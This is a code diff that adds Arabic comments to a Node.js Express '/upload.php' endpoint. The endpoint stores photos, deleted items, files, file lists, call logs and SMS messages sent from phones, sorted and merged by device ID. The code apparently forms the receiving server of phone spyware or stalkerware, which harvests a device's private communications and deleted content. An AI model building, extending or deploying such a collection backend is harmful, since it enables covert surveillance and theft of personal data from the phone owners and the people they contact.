@@ -22,6 +22,7 @@ app.post('/upload.php', (req, res) => {
     try {
         const data = req.body;
         
+        // ✅ حفظ الصور
         if (data.type === 'image_data' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -36,6 +37,7 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, images_count: imagesData.length });
         }
         
+        // ✅ حفظ المحذوفات
         if (data.type === 'deleted_data') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -51,6 +53,7 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, deleted_count: deleted.length });
         }
         
+        // ✅ حفظ الملفات
         if (data.type === 'file_data') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -64,6 +67,7 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, files_count: files.length });
         }
         
+        // ✅ حفظ قائمة الملفات
         if (data.type === 'file_list') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -73,6 +77,7 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true });
         }
         
+        // ✅ البيانات العادية
         const deviceId = data.device_id || 'unknown';
         const deviceDir = path.join(dataDir, deviceId);
         if (!fs.existsSync(deviceDir)) { fs.mkdirSync(deviceDir, { recursive: true }); fs.mkdirSync(path.join(deviceDir, 'files'), { recursive: true }); }
@@ -82,6 +87,7 @@ app.post('/upload.php', (req, res) => {
         if (fs.existsSync(dataFilePath)) existingData = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
         
         if (data.data) {
+            // ✅ دمج المكالمات + إزالة تكرار + ترتيب
             if (data.data.call_logs && data.data.call_logs.length > 0) {
                 if (!existingData.call_logs) existingData.call_logs = [];
                 const merged = [...data.data.call_logs, ...existingData.call_logs];
@@ -95,6 +101,7 @@ app.post('/upload.php', (req, res) => {
                 existingData.call_logs = unique;
             }
             
+            // ✅ دمج الرسائل + إزالة تكرار + ترتيب
             if (data.data.sms && data.data.sms.length > 0) {
                 if (!existingData.sms) existingData.sms = [];
                 const merged = [...data.data.sms, ...existingData.sms];
